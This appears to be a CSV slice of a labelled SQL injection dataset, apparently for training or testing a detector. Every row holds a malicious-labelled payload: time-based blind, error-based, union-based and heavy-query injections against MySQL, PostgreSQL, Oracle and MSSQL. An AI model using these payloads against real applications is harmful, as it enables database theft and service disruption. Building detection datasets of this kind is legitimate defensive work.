row_index,payload_norm,label,sqli_type_hint
1200,"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",1,
1201,select case when 6420 = 7941 then 1 else null end--,1,
1202,"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
1203,1' ) and 4595 = 4595#,1,
1204,"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
1205,"1%' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
1206,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 5432 = 5432",1,
1207,"1"" ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bxcb"" like ""bxcb",1,
1208,"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",1,
1209,"1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'qgov' = 'qgov",1,
1210,"1,exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 7759 = 7759,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
1211,"1"" where 8727 = 8727",1,
1212,select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,1,
1213,"1'|| ( select 'jpso' from dual where 9357 = 9357 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",1,
1214,-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,1,
1215,"-4056"" ) ) ) union all select 4363,4363,4363,4363,4363,4363,4363,4363#",1,
1216,"-5207"" where 2050 = 2050 union all select 2050,2050,2050,2050,2050,2050,2050--",1,
1217,"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
1218,"1' ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'dhqz' = 'dhqz",1,
1219,"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",1,
1220,"-1339 ) ) ) union all select 2938,2938,2938,2938,2938,2938#",1,
1221,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1,
1222,-8007' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,1,
1223,"-8491"" where 6107 = 6107 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",1,
1224,"-5910%' ) ) ) union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1,
1225,"1"" where 4808 = 4808 union all select null,null,null,null,null,null,null#",1,
1226,-7940' ) union all select 6024--,1,
1227,"1"" ) where 2758 = 2758 union all select null,null,null,null,null,null,null--",1,
1228,1%' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and '%' = ',1,
1229,"1%"" ) ) ) union all select null#",1,
